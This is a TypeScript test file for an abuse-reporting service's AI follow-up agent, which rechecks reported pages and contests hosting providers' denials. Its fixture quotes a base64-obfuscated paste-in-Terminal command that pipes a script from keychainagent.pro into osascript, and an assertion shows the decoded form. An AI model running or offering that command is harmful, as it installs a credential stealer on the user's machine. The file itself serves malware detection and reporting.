import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import sharp from "sharp";

import { useTemporaryDatabase } from "../../db/test_helpers";
import { validateAbuseReportRequest } from "../contracts";
import type { sendAbuseEmailRoute } from "../mail";
import { ProviderSubmissionRejectedError, type DecisionAnswer, type ProviderSubmissionProvider } from "../providers/submission_contracts";
import { AbuseRepository } from "../repository";
import { UnknownExternalStateError } from "../worker/shared";
import { capturedDocumentContent, type WebsiteArchiveResult } from "../../website_archive";
import type { DecisionAgentModel } from "./agent";
import { followUpProviderDecision } from "./decision";

useTemporaryDatabase();

const originalSecret = process.env.ABUSE_TRACKING_TOKEN_SECRET;
beforeAll(() => { process.env.ABUSE_TRACKING_TOKEN_SECRET = "decision-follow-up-test-secret-32-bytes!"; });
afterAll(() => {
	if (originalSecret === undefined) delete process.env.ABUSE_TRACKING_TOKEN_SECRET;
	else process.env.ABUSE_TRACKING_TOKEN_SECRET = originalSecret;
});

// Production case 375628583143477248: paneo.work hides its command in an install dialog;
// keychainagent.pro serves the payload only to curl. Cloudflare denied the page as no_abuse_found.
const COMMAND = `echo "https://apps.apple.com/app/paneo-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3daWkxSOXhZMjlvNCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const PAGE = `<html><body><h1>Window Manager for Power Users</h1><a href="#download">Download for macOS</a>
<div class="install-modal" role="dialog" hidden><h2>Install Paneo</h2><p>1 Open Terminal</p><code>${COMMAND}</code></div></body></html>`;
const PNG = await sharp({ create: { width: 64, height: 48, channels: 3, background: "#ffffff" } }).png().toBuffer();

/**
 * A capture as the archive makes it: the snapshot holds the whole DOM, the
 * archive's HTML and text only what a visitor sees, so not the closed dialog.
 */
function liveCapture(url: string): WebsiteArchiveResult {
	const visible = capturedDocumentContent(PAGE);
	return {
		requestedUrl: url,
		url,
		hostname: new URL(url).hostname,
		navigationHops: [{ index: 0, url, hostname: new URL(url).hostname, status: 200, contentCaptured: true }],
		archivedAt: new Date("2026-11-16T15:00:00Z"),
		route: "residential exit",
		userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
		screenshotPng: PNG,
		mhtml: Buffer.from(`From: <Saved by Blink>\r\nSnapshot-Content-Location: ${url}\r\nContent-Type: text/html\r\n\r\n${PAGE}`),
		html: Buffer.from(visible.html),
		text: Buffer.from(visible.text),
	};
}

/** The payload host as observed: curl gets the file, browsers a 404. */
const payloadHost = (async (input: URL | RequestInfo, init?: RequestInit) => {
	const agent = new Headers(init?.headers).get("user-agent") ?? "";
	return agent.startsWith("curl/") ? new Response("var loader = 1;", { headers: { "content-type": "application/octet-stream" } }) : new Response("not found", { status: 404 });
}) as typeof fetch;

/** A model that plays its turns in order, recording what it was given each time. */
function scripted(...turns: Array<Array<Record<string, unknown>>>) {
	const inputs: unknown[][] = [];
	const model: DecisionAgentModel = async ({ input }) => {
		inputs.push([...input]);
		const output = turns.shift();
		if (!output) throw new Error("The scripted model ran out of turns.");
		return { output };
	};
	return { model, inputs };
}
const call = (name: string, args: Record<string, unknown>, id = name) => ({ type: "function_call", call_id: id, name, arguments: JSON.stringify(args) });

async function deniedRoute(target: string, observedUrl: string) {
	const request = await validateAbuseReportRequest({ targets: [target], allegationCategory: "malware", description: "The page tells visitors to paste a command that installs a stealer.", observedUrls: [{ target, urls: [observedUrl] }] });
	const report = await AbuseRepository.createReport({ request, reporter: { reporterHeaders: { "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36" } } });
	const [reportTarget] = await AbuseRepository.listTargets(report.reportId);
	const route = await AbuseRepository.upsertResolvedRoute(reportTarget!.id, {
		routeKey: "provider_submission:cloudflare:contact", providerRegistryKey: "cloudflare", providerDisplayName: "Cloudflare Abuse",
		routeType: "provider_submission", resolverProvenance: { source: "test" }, resolutionSnapshot: { source: "test" }, status: "verified",
	});
	const run = await AbuseRepository.createProviderRun({ routeId: route.id, providerPayload: {}, correlationKey: `cf:${route.id.toString()}` });
	await AbuseRepository.settleProviderRun({ runId: run.id, executionStatus: "completed", routeStatus: "submitted", confirmationId: "35b8aafac3a6a6d9", submittedTargets: [target] });
	await AbuseRepository.recordProviderCorrespondence({ route, messages: [{ id: "response-1", subject: "[35b8aafac3a6a6d9]: Response to your Phishing report", body: "We could not detect any abusive or malicious content.", sentAt: new Date(), from: "Cloudflare Abuse" }] });
	return { reportId: report.reportId, route };
}

function recordingSend() {
	const sent: Array<Parameters<typeof sendAbuseEmailRoute>[0]> = [];
	const send = (async (params) => { sent.push(params); return { messageId: 1n, status: "sent", rfcMessageId: "<x@phishing.support>" }; }) as typeof sendAbuseEmailRoute;
	return { sent, send };
}

const tools = { capture: async ({ url }: { url: string }) => liveCapture(url), fetch: payloadHost, assertPublicHost: async () => {}, timestamp: async () => undefined };

describe("provider decision follow-up agent", () => {
	test("investigates with its tools, then sends its own answer exactly as written, with the screenshot it chose", async () => {
		const { reportId, route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const text = "Hello Cloudflare Trust & Safety,\n\nThe install command sits in a dialog that only opens from the download button; it is still there.\n\nThank you,\nphishing.support";
		const { model, inputs } = scripted(
			[{ type: "reasoning", id: "r1", encrypted_content: "x" }, call("recheck_page", { url: "https://paneo.work/", device: "case" })],
			[call("fetch_url", { url: "https://keychainagent.pro/wksxgj/wZZLR9xY29o4", userAgent: "curl/8.7.1" }), call("fetch_url", { url: "https://keychainagent.pro/wksxgj/wZZLR9xY29o4", userAgent: "Mozilla/5.0" }, "fetch-browser")],
			[call("answer", { text, attachments: ["recheck-1.png", "missing.png"], summary: "The command still sits in the install dialog; asked them to open it." })],
		);

		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, { model, tools, send })).toBe("sent");

		// The agent starts from the decision, the report and the whole correspondence.
		const context = JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text);
		expect(context).toMatchObject({ provider: "Cloudflare", channel: { kind: "email", to: "abusereply@cloudflare.com" }, decision: { state: "denied", reason: "no_abuse_found" }, report: { receipt: "35b8aafac3a6a6d9", target: "paneo.work", allegation: "malware" } });
		expect(context.correspondence.map((message: { subject: string }) => message.subject)).toEqual(["[35b8aafac3a6a6d9]: Response to your Phishing report"]);
		// The recheck's result reached the model: the hidden dialog's command, decoded, and its screenshot.
		const recheck = JSON.parse((inputs[1]!.find((item) => (item as { type?: string }).type === "function_call_output") as { output: string }).output);
		expect(recheck).toMatchObject({ reached: true, route: "residential exit", screenshot: "recheck-1.png" });
		// Production 2026-11-16: macmorrow.app's command sits in a dialog that is `hidden` until a
		// click; the visible text lacks it, so the agent wrongly concluded the command was gone.
		expect(recheck.visiblePageText).not.toContain("base64");
		expect(recheck.fullDocumentText).toContain("1 Open Terminal");
		expect(recheck.pasteCommands[0].decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 | osascript -l JavaScript"]);
		// Each turn carries the previous turns, reasoning included.
		expect(inputs[1]).toContainEqual({ type: "reasoning", id: "r1", encrypted_content: "x" });
		const fetches = inputs[2]!.filter((item) => (item as { type?: string }).type === "function_call_output").slice(-2).map((item) => JSON.parse((item as { output: string }).output));

		expect(fetches.map(({ status }) => status)).toEqual([200, 404]);

		expect(sent).toHaveLength(1);
		expect(sent[0]).toMatchObject({ recipient: "abusereply@cloudflare.com", subject: "[35b8aafac3a6a6d9] Additional evidence for abuse report 35b8aafac3a6a6d9", body: text });
		// Only files that exist are attached.
		expect(sent[0]!.attachments!.map(({ filename }) => filename)).toEqual(["recheck-1.png"]);
		const events = await AbuseRepository.listEvents(reportId);
		expect(events.find((event) => event.eventType === "provider_decision.followed_up")?.data).toMatchObject({ to: "abusereply@cloudflare.com", summary: "The command still sits in the install dialog; asked them to open it." });
		const transcript = (await AbuseRepository.listArtifacts(reportId)).find((artifact) => artifact.kind === "decision_follow_up_transcript");
		expect(JSON.parse(Buffer.from(transcript!.blob).toString("utf8")).steps.map(({ tool }: { tool: string }) => tool)).toEqual(["recheck_page", "fetch_url", "fetch_url", "answer"]);
	});

	test("an agent that decides not to answer sends nothing, records its reason, and is not asked again", async () => {
		const { reportId, route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const first = scripted([call("do_not_answer", { reason: "The page no longer shows the command; Cloudflare is right." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "content_removed" }, { model: first.model, tools, send })).toBe("skipped");
		expect(sent).toEqual([]);
		expect((await AbuseRepository.listEvents(reportId)).find((event) => event.eventType === "provider_decision.not_answered")?.data).toMatchObject({ state: "denied", reason: "The page no longer shows the command; Cloudflare is right." });
		const again = scripted();
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied" }, { model: again.model, tools, send })).toBe("skipped");
		expect(again.inputs).toHaveLength(0);
	});

	test("a model that stops talking is reminded to decide; one that never decides fails the job for a retry", async () => {
		const { route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const reminded = scripted([{ type: "message", content: [{ type: "output_text", text: "Thinking." }] }], [call("do_not_answer", { reason: "Nothing new." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied" }, { model: reminded.model, tools, send })).toBe("skipped");
		expect(JSON.stringify(reminded.inputs[1]!.at(-1))).toContain("Finish by calling answer or do_not_answer.");

		const other = await deniedRoute("paneo.work", "https://paneo.work/");
		const silent: DecisionAgentModel = async () => ({ output: [{ type: "message", content: [] }] });
		await expect(followUpProviderDecision({ routeId: other.route.id, state: "denied" }, { model: silent, tools, send })).rejects.toThrow("did not decide");
		expect(sent).toEqual([]);
	});
});

describe("answering through a provider's form", () => {
	/** Eranet's supplement form as a test double: what it was given, and whether the answer was recorded first. */
	function formProvider(behave: (markSending: () => Promise<void>) => Promise<void> = (mark) => mark()) {
		const calls: Array<{ answer: DecisionAnswer; recordedBefore: boolean }> = [];
		const provider = {
			definition: { key: "cloudflare", displayName: "Eranet Fraud & Phishing Report" },
			decisionFollowUp: {
				contestedStates: ["supplement required"],
				addressee: "Eranet",
				channel: {
					kind: "form" as const,
					name: "Eranet's supplement form",
					requirements: "Requires at least one screenshot.",
					submit: async (answer: DecisionAnswer, markSending: () => Promise<void>) => {
						let recorded = false;
						await behave(async () => { await markSending(); recorded = true; });
						calls.push({ answer, recordedBefore: recorded });
					},
				},
			},
		} as unknown as ProviderSubmissionProvider;
		return { calls, providerFor: () => provider };
	}
	const answering = () => scripted([call("recheck_page", { url: "https://paneo.work/", device: "case" })], [call("answer", { text: "Hello Eranet,\n\nThe site still serves the stealer command.", attachments: ["recheck-1.png"], summary: "Still served." })]).model;
	const formAnswers = async (reportId: bigint) => (await AbuseRepository.listMailForReport(reportId)).filter((message) => message.kind === "provider_form");

	test("files the agent's answer through the form, recorded right before the filing request, once per decision", async () => {
		const { reportId, route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { calls, providerFor } = formProvider();
		const { model, inputs } = scripted([call("recheck_page", { url: "https://paneo.work/", device: "case" })], [call("answer", { text: "Hello Eranet,\n\nThe site still serves the stealer command.", attachments: ["recheck-1.png"], summary: "Still served." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "supplement required", detail: "Based on the materials you have provided, we are unable to determine whether the website has committed any violations." }, { model, tools, providerFor })).toBe("sent");
		expect(JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text).channel).toEqual({ kind: "form", name: "Eranet's supplement form", requirements: "Requires at least one screenshot." });
		expect(calls).toHaveLength(1);
		expect(calls[0]!.recordedBefore).toBeTrue();
		expect(calls[0]!.answer).toMatchObject({ confirmationId: "35b8aafac3a6a6d9", body: "Hello Eranet,\n\nThe site still serves the stealer command." });
		expect(calls[0]!.answer.attachments.map(({ filename }) => filename)).toEqual(["recheck-1.png"]);
		expect(await formAnswers(reportId)).toMatchObject([{ direction: "outbound", status: "sent", toAddresses: ["Eranet's supplement form"], correlationKey: `decision-follow-up:${route.id.toString()}:supplement required` }]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "supplement required" }, { model: scripted().model, tools, providerFor })).toBe("skipped");
	});

	test("a failure before the filing request is retried; one of the request itself never is; a named refusal settles it", async () => {
		const before = await deniedRoute("paneo.work", "https://paneo.work/");
		await expect(followUpProviderDecision({ routeId: before.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider(async () => { throw new Error("Eranet did not send its verification code"); }).providerFor })).rejects.toThrow("verification code");
		expect(await formAnswers(before.reportId)).toEqual([]);
		expect(await followUpProviderDecision({ routeId: before.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider().providerFor })).toBe("sent");

		const during = await deniedRoute("paneo.work", "https://paneo.work/");
		await expect(followUpProviderDecision({ routeId: during.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider(async (mark) => { await mark(); throw new Error("Eranet Supplement failed with HTTP 502"); }).providerFor })).rejects.toBeInstanceOf(UnknownExternalStateError);
		expect((await formAnswers(during.reportId)).map(({ status }) => status)).toEqual(["pending"]);
		const again = formProvider();
		expect(await followUpProviderDecision({ routeId: during.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: again.providerFor })).toBe("skipped");
		expect(again.calls).toHaveLength(0);

		const refused = await deniedRoute("paneo.work", "https://paneo.work/");
		await expect(followUpProviderDecision({ routeId: refused.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider(async (mark) => { await mark(); throw new ProviderSubmissionRejectedError("Eranet refused the supplement: VerifyCode.NotFound.Code"); }).providerFor })).rejects.toBeInstanceOf(ProviderSubmissionRejectedError);
		expect((await formAnswers(refused.reportId)).map(({ status, error }) => ({ status, error }))).toEqual([{ status: "failed", error: "Eranet refused the supplement: VerifyCode.NotFound.Code" }]);
	});
});
